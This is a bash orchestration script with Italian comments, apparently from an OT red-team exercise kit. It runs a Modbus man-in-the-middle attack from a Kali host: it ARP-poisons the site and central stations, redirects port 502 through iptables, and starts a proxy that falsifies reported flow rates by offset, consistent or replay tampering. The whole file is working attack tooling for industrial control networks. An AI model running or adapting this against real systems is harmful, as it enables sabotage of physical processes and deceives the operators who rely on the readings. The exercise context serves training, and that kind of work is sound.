#!/usr/bin/env bash
# =====================================================================
#  Orchestratore MITM Modbus (Kali) — da invocare dalla console Red Team
#  o a mano. Mette la Kali in mezzo tra la workstation di sito e Centro e
#  avvia il proxy che falsifica la portata.
#
#   ./run_mitm.sh start <central_ip> <site_ip> <delta_m3h> [mode] [learn_s]
#   ./run_mitm.sh stop
#     mode: offset | consistent | replay   (default offset)
#
#  Modi (variabile MITM_MODE):
#   arp   (default)  ARP spoof + iptables REDIRECT trasparente (MITM reale on-wire)
#   route            nessun ARP: il proxy inoltra a <site_ip>; Centro va puntato
#                    sulla Kali per quel sito (fallback affidabile)
# =====================================================================
set -uo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(cd "$DIR/.." && pwd)"
CONF="${OTR_TOPOLOGY:-$ROOT/topology.conf}"
[[ -f "$CONF" ]] || CONF="$ROOT/topology.conf.example"
# shellcheck disable=SC1090
source "$CONF" 2>/dev/null || true
MODBUS_PORT="${MODBUS_PORT:-502}"
PROXY_PORT="${PROXY_PORT:-5503}"
MITM_MODE="${MITM_MODE:-arp}"
IFACE="${OTR_IFACE:-}"
PIDF=/tmp/otr-mitm.pids
# usa il python del venv (dove è installato scapy), altrimenti quello di sistema
PY="$ROOT/.venv/bin/python"; [[ -x "$PY" ]] || PY=python3

cmd="${1:-}"

stop() {
  echo "[MITM] stop"
  if [[ -f "$PIDF" ]]; then
    while read -r pid; do [[ -n "$pid" ]] && kill "$pid" 2>/dev/null; done < "$PIDF"
    rm -f "$PIDF"
  fi
  # pulizia regole/forwarding
  iptables -t nat -D PREROUTING -p tcp --dport "$MODBUS_PORT" -j REDIRECT --to-ports "$PROXY_PORT" 2>/dev/null || true
  sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1 || true
  sleep 0.5
}

start() {
  CENTRAL_IP="${2:?central_ip}"; SITE_IP="${3:?site_ip}"; DELTA="${4:-60}"
  MODE="${5:-offset}"; LEARN="${OTR_LEARN:-8}"
  # Peer da avvelenare sul lato Centro. In rete piatta (1 subnet) = Centro.
  # In teatro a 2 subnet (Centro oltre il router) = GATEWAY della subnet dei siti,
  # perché l'ARP risolve il NEXT-HOP, non l'IP remoto. Imposta OTR_UPSTREAM=<gateway>.
  UPSTREAM="${OTR_UPSTREAM:-$CENTRAL_IP}"
  : > "$PIDF"
  IFARG=(); [[ -n "$IFACE" ]] && IFARG=(--iface "$IFACE")

  if [[ "$MITM_MODE" == "route" ]]; then
    echo "[MITM] modo ROUTE: proxy $PROXY_PORT -> $SITE_IP:$MODBUS_PORT (mode=$MODE delta=+$DELTA)"
    echo "       >>> su Centro, punta il polling del sito su  $ATTACKER_IP:$PROXY_PORT  <<<"
    "$PY" "$DIR/mitm_proxy.py" --listen "0.0.0.0:$PROXY_PORT" \
        --dest "$SITE_IP:$MODBUS_PORT" --mode "$MODE" --delta "$DELTA" --learn "$LEARN" &
    echo $! >> "$PIDF"
    exit 0
  fi

  # --- modo ARP trasparente (MITM reale) ---
  command -v iptables >/dev/null || { echo "iptables mancante"; exit 1; }
  echo "[MITM] modo ARP trasparente | sito=$SITE_IP <-> upstream=$UPSTREAM (lato Centro) | tampering=$MODE delta=+$DELTA m3/h"
  sysctl -w net.ipv4.ip_forward=1 >/dev/null

  # redirige il Modbus intercettato verso il proxy locale
  iptables -t nat -D PREROUTING -p tcp --dport "$MODBUS_PORT" -j REDIRECT --to-ports "$PROXY_PORT" 2>/dev/null || true
  iptables -t nat -A PREROUTING -p tcp --dport "$MODBUS_PORT" -j REDIRECT --to-ports "$PROXY_PORT"

  # proxy trasparente (ricava la dest reale con SO_ORIGINAL_DST)
  "$PY" "$DIR/mitm_proxy.py" --listen "0.0.0.0:$PROXY_PORT" --mode "$MODE" --delta "$DELTA" --learn "$LEARN" &
  echo $! >> "$PIDF"

  # avvelenamento ARP mirato ai due soli host
  "$PY" "$DIR/arp_spoof.py" --a "$SITE_IP" --b "$UPSTREAM" "${IFARG[@]}" &
  echo $! >> "$PIDF"

  echo "[MITM] attivo. Stop con:  $0 stop"
}

case "$cmd" in
  start) start "$@";;
  stop)  stop;;
  *) echo "Uso: $0 start <central_ip> <site_ip> <delta_m3h> | stop"; exit 1;;
esac
